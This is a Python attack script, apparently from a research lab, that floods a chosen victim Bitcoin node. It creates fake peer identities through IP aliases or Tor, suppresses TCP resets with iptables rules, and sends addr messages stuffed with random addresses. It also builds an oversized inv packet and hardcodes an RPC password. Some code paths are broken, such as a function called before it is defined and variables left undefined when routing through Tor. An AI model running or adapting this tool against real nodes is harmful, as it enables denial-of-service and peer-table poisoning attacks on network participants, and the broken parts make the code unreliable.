from _thread import start_new_thread
from bitcoin.core import CBlock
from bitcoin.messages import *
from bitcoin.net import CAddress
from io import BytesIO as _BytesIO
import atexit
import base64
import bitcoin
import datetime
import fcntl
import hashlib
import json
import os
import random
import re
import socket
import socks
import struct
import sys
import time

connectSybilThroughTor = True
sendOnlyOneMessagePerIdentity = True
networkType = 'ipv4'

# Define Tor proxy settings (default Tor SOCKS proxy settings)
TOR_PROXY_HOST = '127.0.0.1'
TOR_PROXY_PORT = 9050


if os.geteuid() != 0:
	sys.exit("\nYou need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.\n")

if not connectSybilThroughTor:
	# Specify the attacker's genuine IP
	attacker_ip = input('\nEnter attacker\'s IP address: ')
else:
	# Automatically read the attacker's onion address when using Tor
	attacker_ip = read_onion_address()
	print(f"\nUsing attacker's Onion address: {attacker_ip}")

# Specify the victim's IP, and port (8333 for Bitcoin)
victim_ip = input('Enter victim\'s IP address: ')
victim_port = 8333

# How many identities should run simultaneously
num_identities = 10

# While attacking the victim, wait this many seconds before sending each version message
seconds_between_version_packets = 0.1









identity_interface = [] # Keeps the IP alias interface and IP for each successful connection
identity_address = [] # Keeps the IP and port for each successful connection
identity_socket = [] # Keeps the socket for each successful connection

# The file where the iptables backup is saved, then restored when the script ends
iptables_file_path = f'{os.path.abspath(os.getcwd())}/backup.iptables.rules'

# Send commands to the Linux terminal
def terminal(cmd):
	return os.popen(cmd).read()

# Send commands to the Bitcoin Core Console
def bitcoin(cmd):
	return os.popen('./../../src/bitcoin-cli -rpcuser=cybersec -rpcpassword=kZIdeN4HjZ3fp9Lge4iezt0eJrbjSi8kuSuOHeUkEUbQVdf09JZXAAGwF3R5R2qQkPgoLloW91yTFuufo7CYxM2VPT7A5lYeTrodcLWWzMMwIrOKu7ZNiwkrKOQ95KGW8kIuL1slRVFXoFpGsXXTIA55V3iUYLckn8rj8MZHBpmdGQjLxakotkj83ZlSRx1aOJ4BFxdvDNz0WHk1i2OPgXL4nsd56Ph991eKNbXVJHtzqCXUbtDELVf4shFJXame -rpcport=8332 ' + cmd).read()

# Function to read the onion address from the hosts file
def read_onion_address():
	torrc_path = os.path.join(os.getcwd(), 'tor-researcher', 'torrc', 'hosts')
	try:
		with open(torrc_path, 'r') as file:
			onion_address = file.readline().strip()  # Read the first line containing the onion address
		return onion_address
	except FileNotFoundError:
		print(f"Error: The file 'hosts' was not found in '{torrc_path}'.")
		sys.exit(1)

# Function to restart Tor
def restart_tor():
	print("Restarting Tor...")
	# Stop Tor
	stop_command = os.path.join('.', 'tor-researcher', 'stop.sh')
	terminal(stop_command)
	# Start Tor
	start_command = os.path.join('.', 'tor-researcher', 'run.sh')
	terminal(start_command)
	print("Tor restarted successfully.")

# Generate a random identity using the broadcast address template
def random_ip():
	# By forcing the IP to be above a certain threshhold, it prevents a lot of errors
	minimum_ip_range = min(int(attacker_ip.split('.')[-1]), int(victim_ip.split('.')[-1])) + 1
	while(True):
		ip = broadcast_address
		old_ip = ''
		while(old_ip != ip):
			old_ip = ip
			ip = ip.replace('255', str(random.randint(minimum_ip_range, 255)), 1)
		# Don't accept already assigned IPs
		if ip == default_gateway: continue
		if ip == victim_ip: continue
		if ip not in [x[0] for x in identity_address]: break
	return ip
	#return f'10.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}'

# Checking the internet by sending a single ping to Google
#def internet_is_active():
#	return os.system('ping -c 1 google.com') == 0

# If all else fails, we can use this to recover the network
#def reset_network():
#	print('Resetting network...')
#	terminal(f'sudo ifconfig {network_interface} {attacker_ip} down')
#	terminal(f'sudo ifconfig {network_interface} {attacker_ip} up')

# Create an alias for a specified identity
def ip_alias(ip_address):
	global alias_num
	print(f'Setting up IP alias {ip_address} on {network_interface}')
	interface = f'{network_interface}:{alias_num}'
	terminal(f'sudo ifconfig {interface} {ip_address} netmask 255.255.255.0 broadcast {broadcast_address} up')
	alias_num += 1
	return interface

# Make a random IPv4/IPv6/OnionV2/OnionV3/I2P/CJDNS address
def generate_random_address(networkType):
	if networkType == 'ipv4':
		return f"{random.randint(0, 255)}.{random.randint(0, 255)}." \
			   f"{random.randint(0, 255)}.{random.randint(0, 255)}"
	elif networkType == 'ipv6':
		return ':'.join(f'{random.randint(0, 65535):x}' for _ in range(8))
	elif networkType == 'onionv2':
		return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz234567', k=16)) + '.onion'
	elif networkType == 'onionv3':
		return base64.b32encode(random.randbytes(22)).decode().lower().strip('=') + '.onion'
	elif networkType == 'i2p':
		return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ234567', k=52)) + '.b32.i2p'
	elif networkType == 'cjdns':
		return 'fc' + ''.join(random.choices('0123456789abcdef', k=30))
	else:
		raise ValueError("Unknown network type")

# Construct an addr packet using python-bitcoinlib
def addr_packet(addresses, networkType):
	msg = msg_addr()
	addrs = []
	for address in addresses:
		addr = CAddress()
		addr.nTime = int(time.time())
		if networkType in ['ipv4', 'ipv6', 'cjdns']:
			addr.ip = address
			addr.port = 8333
		elif networkType in ['onionv2', 'onionv3', 'i2p']:
			# Special handling for Onion and I2P addresses
			addr.service = 0 # Set appropriate service flags
			addr.ip = address
			addr.port = 8333 # or the correct port for these networks
		else:
			raise ValueError("Unknown network type")
		addrs.append(addr)
	msg.addrs = addrs
	return msg


# Construct an inv packet using python-bitcoinlib
def inv_packet():
	msg = msg_inv(bitcoin_protocolversion)
	msg.type = 1
	tx = msg_tx(bitcoin_protocolversion)
	tx.type = 1
	tx.hash = bytearray(random.getrandbits(8) for _ in range(32))
	msg.inv = [tx] * 50001
	return msg

# Construct a version packet using python-bitcoinlib
def version_packet(src_ip, dst_ip, src_port, dst_port):
	msg = msg_version(bitcoin_protocolversion)
	msg.nVersion = bitcoin_protocolversion
	msg.addrFrom.ip = src_ip
	msg.addrFrom.port = src_port
	msg.addrTo.ip = dst_ip
	msg.addrTo.port = dst_port
	# Default is /python-bitcoinlib:0.11.0/
	msg.strSubVer = bitcoin_subversion.encode() # Look like a normal node
	return msg

def ping_packet():
	msg = msg_ping(bitcoin_protocolversion)
	msg.nonce = random.getrandbits(32)
	return msg

# Close a connection
def close_connection(socket, ip, port, interface):
	socket.close()
	terminal(f'sudo ifconfig {interface} {ip} down')

	if socket in identity_socket: identity_socket.remove(socket)
	else: del socket
	if interface in identity_interface: identity_interface.remove(interface)
	if (ip, port) in identity_address: identity_address.remove((ip, port))
	print(f'Successfully closed connection to ({ip} : {port})')


# Creates a fake connection to the victim
def make_fake_connection(src_ip, dst_ip, verbose=True):

	if connectSybilThroughTor:
		# Configure the socket to route through Tor
		s = socks.socksocket()
		s.set_proxy(socks.SOCKS5, TOR_PROXY_HOST, TOR_PROXY_PORT)
		src_port = random.randint(1024, 65535)  # Port number is still required for the socket API, but not used by Tor
		if verbose: print(f'Connecting through Tor to ({dst_ip} : {victim_port})...')

	else:

		src_port = random.randint(1024, 65535)
		dst_port = victim_port
		print(f'Creating fake identity ({src_ip} : {src_port}) to connect to ({dst_ip} : {dst_port})...')

		interface = ip_alias(src_ip)
		identity_interface.append(interface)
		if verbose: print(f'Successfully set up IP alias on interface {interface}')
		if verbose: print('Resulting ifconfig interface:')
		if verbose: print(terminal(f'ifconfig {interface}').rstrip() + '\n')

		if verbose: print('Setting up iptables configurations')
		terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST,ACK -j DROP')
		terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN,ACK -j DROP')
		terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN -j DROP')
		terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST -j DROP')

		if verbose: print('Creating network socket...')
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		if verbose: print(f'Setting socket network interface to "{network_interface}"...')
		success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
		while success == -1:
			print(f'Setting socket network interface to "{network_interface}"...')
			success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
			time.sleep(1)
			print(network_interface)


		if verbose: print(f'Binding socket to ({src_ip} : {src_port})...')
		s.bind((src_ip, src_port))

	if verbose: print(f'Connecting ({src_ip} : {src_port}) to ({dst_ip} : {dst_port})...')
	try:
		s.connect((dst_ip, dst_port))
	except:
		close_connection(s, src_ip, src_port, interface)
		make_fake_connection(random_ip(), dst_ip, False)
		return

	# Send version packet
	version = version_packet(src_ip, dst_ip, src_port, dst_port)
	s.send(version.to_bytes())
	# Get verack packet
	verack = s.recv(1924)
	# Send verack packet
	verack = msg_verack(bitcoin_protocolversion)
	s.send(verack.to_bytes())
	# Get verack packet
	verack = s.recv(1024)

	if verbose: print('Connection successful!')

	identity_address.append((src_ip, src_port))
	identity_socket.append(s)

	# Listen to the connections for future packets
	if verbose: print(f'Attaching attacker script {interface}')
	
	if not connectSybilThroughTor:
		try:
			start_new_thread(attack, (), {
				'socket': s,
				'src_ip': src_ip,
				'src_port': src_port,
				'dst_ip': dst_ip,
				'dst_port': dst_port,
				'interface': interface
			})
		except:
			print('Error: unable to  start thread to sniff interface {interface}')
	else:
		print('Tor does not support simultaneous connections.')

# Send addr repeatedly, or only once per identity based on sendOnlyOneMessagePerIdentity
def attack(socket, src_ip, src_port, dst_ip, dst_port, interface):
	# Generate a new list of 1000 random IP addresses
	random_addresses = [generate_random_address(networkType) for _ in range(1000)]
	addr = addr_packet(random_addresses, networkType).to_bytes()

	if sendOnlyOneMessagePerIdentity:
		try:
			socket.send(addr)
		except Exception as e:
			print(e)
		finally:
			close_connection(socket, src_ip, src_port, interface)
			print(f'Connection closed after sending one message ({src_ip} : {src_port})')
			if connectSybilThroughTor:
				# Restart Tor to get a new onion address
				restart_tor()
	else:
		while True:
			if seconds_between_version_packets != 0:
				time.sleep(seconds_between_version_packets)

			try:
				socket.send(addr)
			except Exception as e:
				print(e)
				break

		close_connection(socket, src_ip, src_port, interface)
		print(f'Peer was banned ({src_ip} : {src_port})')
		if connectSybilThroughTor:
			# Restart Tor to get a new onion address
			restart_tor()

# Initialize the network
def initialize_network_info():
	print('Retrieving network info...')
	global default_gateway, network_interface, broadcast_address

	# Get the network interface of the default gateway
	m = re.search(r'default +via +([^ ]+) +dev +([^ ]+)', terminal('ip route'))
	if m != None:
		default_gateway = m.group(1).strip()
		network_interface = m.group(2).strip()
	else:
		print('Error: Network interface couldn\'t be found.')
		sys.exit()

	# Get the broadcast address of the network interface
	# Used as an IP template of what can change, so that packets still come back to the sender
	m = re.search(r'broadcast ([^ ]+)', terminal(f'ifconfig {network_interface}'))
	if m != None:
		broadcast_address = m.group(1).strip()
	else:
		print('Error: Network broadcast IP couldn\'t be found.')
		sys.exit()

# Initialize Bitcoin info
def initialize_bitcoin_info():
	print('Retrieving bitcoin info...')
	global bitcoin_subversion
	global bitcoin_protocolversion
	bitcoin_subversion = '/Satoshi:0.18.0/'
	bitcoin_protocolversion = 70015
	try:
		network_info = None #json.loads(bitcoin('getnetworkinfo'))
		if 'subversion' in network_info:
			bitcoin_subversion = network_info['subversion']
		if 'protocolversion' in network_info:
			bitcoin_protocolversion = network_info['protocolversion']
	except:
		pass

# Save a backyp of the iptable rules
def backup_iptables():
	terminal(f'iptables-save > {iptables_file_path}')

# Restore the backup of the iptable rules
def cleanup_iptables():
	if(os.path.exists(iptables_file_path)):
		print('Cleaning up iptables configuration')
		terminal(f'iptables-restore < {iptables_file_path}')
		os.remove(iptables_file_path)

# Remove all ip aliases that were created by the script
def cleanup_ipaliases():
	for i in range(0, len(identity_address)):
		try:
			ip = identity_address[i][0]
			interface = identity_interface[i]
			print(f'Cleaning up IP alias {ip} on {interface}')
			terminal(f'sudo ifconfig {interface} {ip} down')
		except: pass

# This function is ran when the script is stopped
def on_close():
	print('Closing open sockets')
	for socket in identity_socket:
		socket.close()
	cleanup_ipaliases()
	cleanup_iptables()
	print('Cleanup complete. Goodbye.')

	#print('Verifying that internet works...')
	#if not internet_is_active():
	#	reset_network()


# This is the first code to run
if __name__ == '__main__':
	global alias_num
	alias_num = 0 # Increments each alias

	initialize_network_info()
	initialize_bitcoin_info()

	atexit.register(on_close) # Make on_close() run when the script terminates
	cleanup_iptables() # Restore any pre-existing iptables before backing up, just in case if the computer shutdown without restoring
	backup_iptables()

	# Create the connections
	for i in range(1, num_identities + 1):
		try:
			make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip)
		except ConnectionRefusedError:
			print('Connection was refused. The victim\'s node must not be running.')

	print(f'Successful connections: {len(identity_address)}\n')

	# Prevent the script from terminating when the sniff function is still active
	while 1:
		time.sleep(60)
